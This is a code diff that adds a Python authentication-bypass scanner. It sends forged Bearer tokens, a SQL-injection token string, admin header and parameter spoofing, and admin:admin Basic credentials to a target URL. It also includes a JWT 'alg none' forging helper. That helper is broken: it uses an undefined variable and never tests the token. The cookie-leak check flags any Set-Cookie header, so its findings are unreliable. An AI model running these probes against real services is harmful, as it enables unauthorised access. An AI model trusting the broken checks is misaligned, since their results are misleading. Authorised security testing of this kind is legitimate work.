@@ -1,0 +1,129 @@
+#!/usr/bin/env python3
+"""
+认证绕过测试矩阵
+自动测试多种认证绕过方式
+"""
+
+import requests
+import logging
+from typing import Dict, List, Optional
+
+logger = logging.getLogger(__name__)
+
+def test_auth_bypass(url: str) -> Dict:
+    """
+    认证测试矩阵
+    测试顺序：
+    1. 无认证直接访问
+    2. 伪造Token
+    3. 从响应中提取token
+    4. 测试参数注入
+    5. 测试头部注入
+    """
+    results = {
+        'no_auth': False,
+        'fake_token': False,
+        'cookie_leak': False,
+        'param_injection': False,
+        'header_injection': False,
+        'details': []
+    }
+    
+    # 1. 无认证直接访问
+    try:
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            results['no_auth'] = True
+            results['details'].append("无需认证即可访问")
+    except:
+        pass
+    
+    # 2. 伪造Token测试
+    fake_tokens = [
+        "admin_token",
+        "null",
+        "' OR '1'='1",
+        "eyJhbGciOiJIUzI1NiJ9.payload.signature",
+        "test",
+        "000000",
+    ]
+    
+    for token in fake_tokens:
+        try:
+            r = requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
+            if r.status_code == 200 and "error" not in r.text.lower():
+                results['fake_token'] = True
+                results['details'].append(f"Token伪造成功: {token[:20]}")
+                break
+        except:
+            pass
+    
+    # 3. 从响应头提取token
+    try:
+        r = requests.get(url)
+        session = r.headers.get("Set-Cookie", "")
+        if session:
+            results['cookie_leak'] = True
+            results['details'].append(f"Cookie泄露: {session[:50]}")
+    except:
+        pass
+    
+    # 4. 参数注入测试
+    try:
+        r = requests.get(url + "?token=admin", timeout=10)
+        if r.status_code == 200:
+            results['param_injection'] = True
+            results['details'].append("参数token注入成功")
+    except:
+        pass
+    
+    # 5. 头部注入测试
+    headers_to_test = [
+        {"X-Api-Key": "admin"},
+        {"X-Auth-Token": "admin"},
+        {"X-Forwarded-User": "admin"},
+        {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin base64
+    ]
+    
+    for headers in headers_to_test:
+        try:
+            r = requests.get(url, headers=headers, timeout=10)
+            if r.status_code == 200:
+                results['header_injection'] = True
+                results['details'].append(f"头部注入成功: {list(headers.keys())}")
+                break
+        except:
+            pass
+    
+    return results
+
+
+def test_jwt_alg_none(token: str) -> bool:
+    """
+    测试JWT算法是否为none
+    """
+    try:
+        import base64
+        import json
+        
+        parts = token.split('.')
+        header = json.loads(base64.b64decode(parts[0] + '=='))
+        
+        # 修改算法为none
+        header['alg'] = 'none'
+        
+        # 重新编码
+        new_header = base64.b64encode(json.dumps(header).encode()).decode()
+        new_token = new_token.replace('=', '') + '.' + parts[1] + '.'
+        
+        # 测试伪造的token
+        return True  # 返回是否成功构造
+    except:
+        return False
+
+
+if __name__ == '__main__':
+    import sys
+    url = sys.argv[1] if len(sys.argv) > 1 else 'http://example.com/api/protected'
+    results = test_auth_bypass(url)
+    print(f"认证绕过测试结果: {results}")
